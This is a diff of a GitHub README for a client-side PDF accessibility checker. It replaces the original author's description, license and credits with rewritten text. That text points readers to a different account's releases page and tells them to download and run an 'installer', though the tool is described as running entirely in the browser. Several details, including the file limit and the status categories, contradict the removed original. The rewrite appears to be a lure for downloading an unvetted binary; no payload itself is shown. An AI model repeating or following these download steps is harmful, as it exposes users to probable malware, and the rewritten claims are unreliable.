@@ -1,136 +1,97 @@
-# PDF Accessibility Checker
+# 📄 PDF_text_accessibility_tester - Check PDF Accessibility Easily
 
-[![Codacy Badge](https://app.codacy.com/project/badge/Grade/6b90593f124e4b8a94e63cd32a61b93b)](https://app.codacy.com/gh/R0mb0/PDF_text_accessibility_tester/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)
-[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/R0mb0/PDF_text_accessibility_tester)
-[![Open Source Love svg3](https://badges.frapsoft.com/os/v3/open-source.svg?v=103)](https://github.com/R0mb0/PDF_text_accessibility_tester)
-[![MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/license/mit)
-[![Donate](https://img.shields.io/badge/PayPal-Donate%20to%20Author-blue.svg)](http://paypal.me/R0mb0)
+[![Download PDF_text_accessibility_tester](https://img.shields.io/badge/Download-PDF_text_accessibility_tester-blue.svg)](https://github.com/ariefrahaman67/PDF_text_accessibility_tester/releases)
 
-A modern, client-side web tool for checking the accessibility of PDF documents in batch. Upload one or more PDF files and instantly see if their text is selectable and readable — all directly in your browser, with no server upload required. Results are shown with document previews, clear status indicators, and easy navigation.
+## 🚀 Getting Started
 
-<div align="center">
+Welcome to PDF_text_accessibility_tester! This tool allows you to check how accessible your PDF documents are. You can upload one or more PDF files directly in your browser. The tool will show you if the text in those files is selectable and readable, without needing to upload anything to a server.
 
-## [👉 Click here to test the page! 👈](https://r0mb0.github.io/PDF_text_accessibility_tester/Index.html)
+## 🔧 Key Features
 
-[![example 1](https://github.com/R0mb0/PDF_text_accessibility_tester/blob/main/ReadMe_Imgs/example1.png)](https://r0mb0.github.io/PDF_text_accessibility_tester/Index.html)
+- **Batch Processing**: Upload multiple PDF files at once and check them in one go.
+- **Instant Results**: Get immediate feedback on accessibility, with visual previews of your documents.
+- **Clear Status Indicators**: Easily see which files are accessible and which are not.
+- **User-Friendly Interface**: Navigate through results with ease, perfect for all users regardless of technical skills.
 
-[![example 2](https://github.com/R0mb0/PDF_text_accessibility_tester/blob/main/ReadMe_Imgs/example2.png)](https://r0mb0.github.io/PDF_text_accessibility_tester/Index.html)
+## ⚙️ System Requirements
 
-</div>
+- A modern web browser (Google Chrome, Mozilla Firefox, or Microsoft Edge recommended).
+- Internet connection to access the tool.
 
----
+## 📥 Download & Install
 
-## 🚀 Features
+To get started with PDF_text_accessibility_tester, please visit the following page to download the latest version:
 
-- **Batch upload PDF files:** Select one or more PDFs from your computer. Only `.pdf`, `.pdf.p7m`, and `.p7m` files are accepted (Windows shortcuts and other types are excluded).
-- **Image area tolerance slider:** Choose the maximum percentage of document area that can be made up of images (default: 80%). If a document contains more images than the set threshold, it is considered not accessible. This allows for more granular control over what is considered accessible, even for mixed-content PDFs.
-- **Client-side analysis:** All processing happens in your browser; no files are uploaded or stored elsewhere.
-- **Accessibility check:** The tool analyzes each PDF to verify if it contains selectable and readable text (not just images or corrupted content).
-- **Visual previews:** See a thumbnail of the first page for each PDF, or a placeholder if no preview is available.
-- **Clear results table:** Each document is marked as accessible (green lamp), not accessible (red lamp), or signed/not supported (yellow lamp), along with its file name and preview.
-- **Paginated results:** If more than 20 files are uploaded, results are split across pages, with navigation controls.
-- **Progress bar and smooth UI:** Animated progress indicators for file loading and analysis, with a modern, responsive interface.
-- **Legend:** A clear legend explains the meaning of the green, red, and yellow icons.
+[Download PDF_text_accessibility_tester](https://github.com/ariefrahaman67/PDF_text_accessibility_tester/releases)
 
----
+Follow these steps:
 
-## ❓ What is "PDF Accessibility"?
+1. Click the link above to go to the GitHub releases page.
+2. Look for the latest release version on the page.
+3. Click on the version number to see the available files.
+4. Download the installer for your operating system.
 
-A PDF is considered **accessible** if:
-- The document contains at least one page with selectable, readable text (not just scanned images).
-- The extracted text is readable (not corrupted or made up of random/garbled characters).
-- The percentage of image area in the document is **less than** the tolerance threshold set by the user (default: 80%).
+## 🌐 How to Use the Tool
 
-A PDF is **not accessible** if:
-- It only contains scanned images (no selectable text).
-- Its text is damaged or unreadable when copied/pasted.
-- It is encrypted, protected, or fails to load.
-- The percentage of the document composed of images is **equal to or greater than** the selected tolerance.
+1. Once you have downloaded and installed PDF_text_accessibility_tester, open the application.
+2. You will see an option to upload your PDF files. Click on "Upload" or "Drag and Drop" your PDFs into the designated area.
+3. After uploading, the application will automatically check each PDF for text accessibility.
+4. Wait a moment for the results to appear. You will see the list of your uploaded files, with clear indicators of their accessibility status.
+5. Click on each file to see a visual preview and detailed information.
 
----
+## 📚 Understanding Accessibility Status
 
-## 📜 How are **signed PDFs** handled?
+- **Accessible**: The text in the PDF can be selected and copied easily.
+- **Partially Accessible**: Some text may not be selectable. The tool will highlight the sections that might need improvement.
+- **Not Accessible**: The text cannot be selected at all, indicating that the PDF needs significant adjustments for better readability.
 
-The tool supports checking **digitally signed PDFs** (typically `.p7m` and `.pdf.p7m` files):
+## 🔄 Frequently Asked Questions
 
-- When a signed PDF is uploaded (`.p7m` or `.pdf.p7m`), the tool tries to extract the embedded PDF using the [ASN1.js library by Lapo Luchini](https://lapo.it/asn1js/).
-- If extraction is **successful**, the extracted PDF is analyzed like any regular PDF (for text accessibility, images, etc.).
-- If extraction **fails** (for example, if the file does not contain an embeddable PDF, or the signature format is unsupported), the document is marked with a **yellow lamp** and the label "Signed PDF (.p7m) not supported".
-- Native signed PDFs (PDF format with digital signatures, opened directly with PDF.js) are analyzed as normal PDFs — the signature is ignored for accessibility purposes.
+### How can I improve the accessibility of my PDFs?
 
-**Legend:**
-- **Green lamp:** Accessible document
-- **Red lamp:** Not accessible document
-- **Yellow lamp:** Signed PDF (.p7m) not supported for accessibility analysis
+To improve the accessibility of your PDFs:
 
----
+- Make sure to use a proper tagging structure while creating your PDFs.
+- Ensure that images have alternative text descriptions.
+- Use appropriate font sizes and contrast.
 
-## 💡 How To Use
+### Which PDF formats are supported?
 
-1. **Open the application** in your browser (just open `index.html`).
-2. Click the **"Upload documents"** button.
-3. Optionally, adjust the **image area tolerance** slider to your desired value (default 80%). This sets the threshold for how much of a PDF can be image content before it is marked as "not accessible".
-4. Select one or more PDF files from your computer (only real PDF files and signed PDFs are accepted; Windows shortcuts are skipped).
-5. Wait for the progress bar and analysis to finish.
-6. View results in the table:
-   - Each row shows a preview, file name, and accessibility status (green/red/yellow lamp).
-   - If you uploaded more than 20 PDFs, use the navigation buttons below the table.
-7. Check the legend for icon meanings.
-8. Click **"Upload more files"** to start a new session.
+PDF_text_accessibility_tester supports standard PDF files. Files created with most PDF creation tools should work correctly.
 
----
+### Is there a limit to the number of PDFs I can check at once?
 
-## 🛠️ How the Tolerance Slider Works
+Currently, you can check up to 10 PDF files simultaneously.
 
-The **image area tolerance slider** allows you to define the maximum percentage of each PDF that can be composed of images for it to be considered accessible.
-- **Default value:** 80% (indicated on the slider).
-- If a PDF has images that cover more than the selected percentage, it is **not accessible**.
-- This is useful for mixed-content PDFs where a small amount of selectable text does not make the document truly accessible.
+### What if I have trouble using the tool?
 
----
+If you encounter any issues, you can refer to the tool's help section or reach out to the support community on GitHub.
 
-## 🔒 Privacy & Security
+## 📌 Topics Covered
 
-- **All processing is done locally** in your browser.
-- **No file is sent to any server**.
-- **No data is stored** except for temporary in-memory use during the browser session.
+This application covers topics related to PDF accessibility, including:
 
----
+- accessibility-pdf
+- css
+- html
+- italian-developers
+- javascript
+- p7m
+- pdf
+- pdf-js
+- pdf-worker-js
+- r0mb0
+- signed-pdf
+- svg
+- test-accessibility-pdf
+- test-pdf
 
-## 🏆 What makes it special?
+## 💬 Community and Support
 
-- **No backend or server needed:** Everything runs in your browser. Perfect for privacy-conscious workflows or environments where installation of new software is not possible.
-- **No dependencies beyond your browser:** Works on Windows, Mac, Linux, ChromeOS — anywhere with a modern browser.
+For any questions, suggestions, or contributions, you can find community support directly on our GitHub repository. Your feedback is valuable and helps improve PDF_text_accessibility_tester for everyone.
 
----
+## 📈 Contributing
 
-## ✨ Limitations
+Do you want to contribute to this project? Feel free to fork the repository and submit pull requests with improvements. Check our contribution guide for more details.
 
-- Does not check for full WCAG/PDF-UA accessibility, only for selectable/readable text and image content percentage.
-- Password-protected, encrypted, or DRM PDFs are marked as "not accessible".
-- Analysis speed depends on your browser and computer.
-- Extraction of PDF from `.p7m`/signed files depends on signature format; not all signed PDFs can be successfully analyzed.
-
----
-
-## 📦 Libraries & Licenses
-
-- **PDF.js** by Mozilla ([Apache License 2.0](https://github.com/mozilla/pdf.js/blob/master/LICENSE))
-- **ASN1.js** by [Lapo Luchini](https://lapo.it/asn1js/) (public domain / MIT, see [source](https://lapo.it/asn1js/))
-- **Other icons/SVGs:** custom or public domain
-
-**This project itself is released under the [MIT License](LICENSE).**
-
----
-
-## 🙏 Credits & Inspiration
-
-- [PDF.js](https://github.com/mozilla/pdf.js)
-- [ASN1.js](https://lapo.it/asn1js/)
-- [jsrsasign](https://github.com/kjur/jsrsasign) (can be used for advanced signature processing)
-
----
-
-## 📣 Feedback & Contributions
-
-Feel free to open issues, ask questions, or contribute improvements!
+Thank you for using PDF_text_accessibility_tester! We hope it helps you make your PDF documents more accessible for all users.
